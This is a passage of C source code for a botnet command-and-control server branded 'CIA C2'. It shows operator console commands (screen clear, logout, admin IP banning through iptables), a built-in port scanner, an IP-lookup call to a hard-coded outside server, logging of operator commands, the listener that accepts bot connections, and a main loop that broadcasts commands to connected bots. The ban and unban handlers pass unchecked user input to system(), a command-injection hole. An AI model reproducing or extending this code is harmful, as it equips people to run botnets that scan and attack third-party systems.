			if(strstr(buf, "CLEAR") || strstr(buf, "clear") || strstr(buf, "Clear") || strstr(buf, "cls") || strstr(buf, "CLS") || strstr(buf, "Cls")) {
				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
				sprintf(clearscreen, "\033[2J\033[1;1H");
				if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, ascii_banner_line0, strlen(ascii_banner_line0), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, ascii_banner_linem, strlen(ascii_banner_linem), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;			
		        if(send(datafd, ascii_banner_lineq, strlen(ascii_banner_lineq), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, ascii_banner_linel, strlen(ascii_banner_linel), MSG_NOSIGNAL) == -1) goto end;
		char input [5000];
        sprintf(input, "\e[0;97m[\e[1;34m%s\e[0;97m@\e[1;34mCia\e[0;97m]: ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
			
			if(strstr(buf, ".Logout") || strstr(buf, ".logout") || strstr(buf, ".LOGOUT")) {
			pthread_create(&title, NULL, &TitleWriter, sock);
			char logoutmessage1 [2048];

			sprintf(logoutmessage1, "\e[1;34mLogging Out Of The \e[1;97mCIA \e[1;34mC2\r\n");

			if(send(datafd, logoutmessage1, strlen(logoutmessage1), MSG_NOSIGNAL) == -1)goto end;;
			sleep(5);
			goto end;			
			}

		 if(strstr(buf, ".BANIP") || strstr(buf, ".Banip") || strstr(buf, ".banip")) {	
        if(!strcmp(accounts[find_line].type, "admin")){
        char bannie111[40];
        char commandban[80];
        char commandban1[80];

        if(send(datafd, "\x1b[1;36mIp\x1b[1;31m:\x1b[1;36m ", strlen("\x1b[1;36mIp\x1b[1;31:\x1b[1;36m "), MSG_NOSIGNAL) == -1) goto end;
        memset(bannie111, 0, sizeof(bannie111));
        read(datafd, bannie111, sizeof(bannie111));
        trim(bannie111);
                
        char banmsg[80];

        sprintf(commandban, "iptables -A INPUT -s %s -j DROP", bannie111);
        sprintf(commandban1, "iptables -A OUTPUT -s %s -j DROP", bannie111);

        system(commandban);
        system(commandban1);
        LogFile2 = fopen("/root/Logs/ip.ban.unban.log", "a");
        fprintf(LogFile2, "[banned] |ip:%s|\n", bannie111);
        fclose(LogFile2);

        sprintf(banmsg, " \x1b[1;36mIp\x1b[1;36m:\x1b[1;36m%s\x1b[1;36m Is Banned\r\n", bannie111);
        if(send(datafd, banmsg,  strlen(banmsg),    MSG_NOSIGNAL) == -1) goto end; 

        char input [5000];
        sprintf(input, "\e[0;97m[\e[1;34m%s\e[0;97m@\e[1;34mCia\e[0;97m]: ", accounts[find_line].username);
        if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
    }
    else
        if(send(datafd, "\x1b[1;97mAccess Denied\r\n", strlen("\x1b[1;97mAccess Denied\r\n"), MSG_NOSIGNAL) == -1) goto end;
}
if(strstr(buf, ".UNBANIP") || strstr(buf, ".Unbanip") || strstr(buf, ".unbanip")) {
    if(!strcmp(accounts[find_line].type, "admin")){
        char bannie1 [800];
        char commandunban[80];
        char commandunban1[80];

        if(send(datafd, "\x1b[1;36mIp\x1b[1;31m: \x1b[\x1b[1;36mm", strlen("\x1b[\x1b[1;36mIp\x1b[1;31m: \x1b[1;36m"), MSG_NOSIGNAL) == -1) goto end;
        memset(bannie1, 0, sizeof(bannie1));
        read(datafd, bannie1, sizeof(bannie1));
        trim(bannie1);

        char unbanmsg[80];

        sprintf(commandunban, "iptables -D INPUT -s %s -j DROP", bannie1);
        sprintf(commandunban1, "iptables -D OUTPUT -s %s -j DROP", bannie1);

        system(commandunban);
        system(commandunban1);
        LogFile2 = fopen("/root/Logs/ip.ban.unban.log", "a");

        fprintf(LogFile2, "[unbanned] |ip:%s|\n", bannie1);
        fclose(LogFile2);

        sprintf(unbanmsg, "ip:%s is unbanned\r\n", bannie1);

        if(send(datafd, unbanmsg,  strlen(unbanmsg),    MSG_NOSIGNAL) == -1) goto end;  

        char input [5000];
        sprintf(input, "\e[0;97m[\e[1;34m%s\e[0;97m@\e[1;34mCia\e[0;97m]: ", accounts[find_line].username);
        if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
    }
    else
        if(send(datafd, "\x1b[1;97mAccess Denied\r\n", strlen("\x1b[1;97mAccess Denied\r\n"), MSG_NOSIGNAL) == -1) goto end;
}

              if(strstr(buf, ".PORTSCAN ") || strstr(buf, ".portscan "))
        {
            int x;
            int ps_timeout = 1; // usually set this as 2 or 3 but 1 is faster since theres going to be customers
            int least_port = 1; // this is the least number we want to set
            int max_port = 1024; // this is the max port we want to check
            char host[16];
            trim(buf);
            char *token = strtok(buf, " ");
            snprintf(host, sizeof(host), "%s", token+strlen(token)+1);
            snprintf(botnet, sizeof(botnet), "\x1b[1;36m[\x1b[0mPortscanner\x1b[1;36m] \x1b[0mChecking ports \x1b[1;36m%d-%d \x1b[0mon -> \x1b[1;36m%s...\x1b[0m\r\n", least_port, max_port, host);
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            for(x=least_port; x < max_port; x++)
            {
                int Sock = -1;
                struct timeval timeout;
                struct sockaddr_in sock;
                // set timeout secs
                timeout.tv_sec = ps_timeout;
                timeout.tv_usec = 0;
                Sock = socket(AF_INET, SOCK_STREAM, 0); // create our tcp socket
                setsockopt(Sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
                setsockopt(Sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
                sock.sin_family = AF_INET;
                sock.sin_port = htons(x);
                sock.sin_addr.s_addr = inet_addr(host);
                if(connect(Sock, (struct sockaddr *)&sock, sizeof(sock)) == -1) close(Sock);
                else
                {
                    snprintf(botnet, sizeof(botnet), "\x1b[1;36m[\x1b[0mPortscanner\x1b[1;36m] %d \x1b[0mis open on \x1b[1;36m%s!\x1b[0m\r\n", x, host);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    memset(botnet, 0, sizeof(botnet));
                    close(Sock);
                }
            }
            snprintf(botnet, sizeof(botnet), "\x1b[1;36m[\x1b[0mPortscanner\x1b[1;36m] \x1b[32mScan on \x1b[1;36m%s \x1b[32mfinished.\x1b[0m\r\n", host);
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }

			        else if(strstr(buf, ".iplookup") || strstr(buf, ".IPLOOKUP"))
        {
            char myhost[20];
            char ki11[1024];
            snprintf(ki11, sizeof(ki11), "%s", buf);
            trim(ki11);
            char *token = strtok(ki11, " ");
            snprintf(myhost, sizeof(myhost), "%s", token+strlen(token)+1);
            if(atoi(myhost) >= 8)
            {
                int ret;
                int IPLSock = -1;
                char iplbuffer[1024];
                int conn_port = 80;
                char iplheaders[1024];
                struct timeval timeout;
                struct sockaddr_in sock;
                char *iplookup_host = "37.49.226.13"; // Change to Server IP
                timeout.tv_sec = 4; // 4 second timeout
                timeout.tv_usec = 0;
                IPLSock = socket(AF_INET, SOCK_STREAM, 0);
                sock.sin_family = AF_INET;
                sock.sin_port = htons(conn_port);
                sock.sin_addr.s_addr = inet_addr(iplookup_host);
                if(connect(IPLSock, (struct sockaddr *)&sock, sizeof(sock)) == -1)
                {
                    //printf("[\x1b[31m-\x1b[31m] Failed to connect to iplookup host server...\n");
                    sprintf(botnet, "\x1b[31;1m[IPLookup] Failed to connect to iplookup server...\x1b[31;1m\r\n", myhost);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                else
                {
                    //printf("[\x1b[32m+\x1b[31m] Connected to iplookup server :)\n");
                    snprintf(iplheaders, sizeof(iplheaders), "GET /iplookup.php?host=%s HTTP/1.1\r\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding:gzip, deflate, sdch\r\nAccept-Language:en-US,en;q=0.8\r\nCache-Control:max-age=0\r\nConnection:keep-alive\r\nHost:%s\r\nUpgrade-Insecure-Requests:1\r\nUser-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/531m.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/531m.36\r\n\r\n", myhost, iplookup_host);
                    if(send(IPLSock, iplheaders, strlen(iplheaders), 0))
                    {
                        //printf("[\x1b[32m+\x1b[31m] Sent request headers to iplookup api!\n");
                        sprintf(botnet, "\x1b[1;36m[\x1b[1;31mCIA\x1b[1;36m] \x1b[1;36mSearching For Database -> %s...\r\n", myhost);
                        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                        char ch;
                        int retrv = 0;
                        uint32_t header_parser = 0;
                        while (header_parser != 0x0D0A0D0A)
                        {
                            if ((retrv = read(IPLSock, &ch, 1)) != 1)
                                break;
                
                            header_parser = (header_parser << 8) | ch;
                        }
                        memset(iplbuffer, 0, sizeof(iplbuffer));
                        while(ret = read(IPLSock, iplbuffer, 1024))
                        {
                            iplbuffer[ret] = '\0';
                            /*if(strlen(iplbuffer) > 1)
                                printf("\x1b[36m%s\x1b[31m\n", buffer);*/
                        }
                        //printf("%s\n", iplbuffer);
                        if(strstr(iplbuffer, "<title>404"))
                        {
                            char iplookup_host_token[20];
                            sprintf(iplookup_host_token, "%s", iplookup_host);
                            int ip_prefix = atoi(strtok(iplookup_host_token, "."));
                            sprintf(botnet, "\x1b[31m[IPLookup] Failed, API can't be located on server %d.*.*.*:80\x1b[0m\r\n", ip_prefix);
                            memset(iplookup_host_token, 0, sizeof(iplookup_host_token));
                        }
                        else if(strstr(iplbuffer, "nickers"))
                            sprintf(botnet, "\x1b[31m[IPLookup] Failed, Hosting server needs to have php installed for api to work...\x1b[0m\r\n");
                        else sprintf(botnet, "\x1b[1;36m[+]--- \x1b[1;31mResults\x1b[1;36m ---[+]\r\n\x1b[01;36m%s\x1b[31m\r\n", iplbuffer);
                        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                    else
                    {
                        //printf("[\x1b[31m-\x1b[31m] Failed to send request headers...\n");
                        sprintf(botnet, "\x1b[31m[IPLookup] Failed to send request headers...\r\n");
                        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                }
                close(IPLSock);
            }
        }

            trim(buf);
		char input [5000];
        sprintf(input, "\e[0;97m[\e[1;34m%s\e[0;97m@\e[1;34mCia\e[0;97m]: ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
            if(strlen(buf) == 0) continue;
            printf("%s: \"%s\"\n",accounts[find_line].username, buf);

			FILE *LogFile;
            LogFile = fopen("/root/Logs/server_history.log", "a");
			time_t now;
			struct tm *gmt;
			char formatted_gmt [50];
			char lcltime[50];
			now = time(NULL);
			gmt = gmtime(&now);
			strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
            fprintf(LogFile, "[%s]: %s\n", formatted_gmt, buf);
            fclose(LogFile);
            broadcast(buf, datafd, accounts[find_line].username);
            memset(buf, 0, 2048);
        }

		end:
		managements[datafd].connected = 0;
		close(datafd);
		OperatorsConnected--;
}
/*STARCODE*/
void *BotListener(int port){
    int sockfd, newsockfd, gay=1;
    struct epoll_event event;
    socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
	if(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &gay, sizeof(int)) < 0) // HUNNNNNNN YEA
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd,5);
    clilen = sizeof(cli_addr);
    while (1){
        newsockfd = accept(sockfd, (struct sockaddr *)&cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        
        struct telnetListenerArgs args;
        args.sock = newsockfd;
        args.ip = ((struct sockaddr_in *)&cli_addr)->sin_addr.s_addr;

        pthread_t thread;
        pthread_create(&thread, NULL, &BotWorker, (void *)&args);
    }   
}
int main (int argc, char *argv[], void *sock) {
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4) {
			fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }

		port = atoi(argv[3]);
		
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "ZERO");
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}
